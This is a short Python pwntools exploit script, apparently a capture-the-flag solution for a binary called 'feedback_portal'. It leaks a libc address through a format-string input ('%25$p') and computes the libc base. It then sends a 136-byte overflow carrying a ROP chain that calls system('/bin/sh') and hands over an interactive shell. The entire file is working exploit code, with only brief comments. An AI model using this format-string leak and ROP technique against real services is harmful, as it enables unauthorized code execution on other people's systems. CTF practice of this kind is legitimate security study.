#!/usr/bin/env python3
from pwn import *

# searching with GDB, we foound taht the offset to use in the format string attack to leak the libc_start_call_main is 25.
# we have also seen that inside the stack, there is __libc_start_main + 120

context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    else:
        return process(elf.path)

p = conn()

RIP_OFFSET = 136

# leaking the libc base address
p.recvuntil(b'name:')
p.sendline(b'%25$p')
p.recvuntil(b'Hello, ')
leaked = p.recvline().strip().decode()
leaked_int = int(leaked, 16)
print(leaked)

libc.address = leaked_int - (libc.symbols['__libc_start_main'] + 120)
print(libc.address) 

# leaking the system address and the bin/sh
binsh = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.symbols['system']

# other addresses 
ret = ROP(elf).find_gadget(['ret']).address
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret']).address

payload = flat(
    b'A' * RIP_OFFSET,
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(system_addr)
)

p.recvuntil(b'feedback:')
p.sendline(payload)
p.interactive()
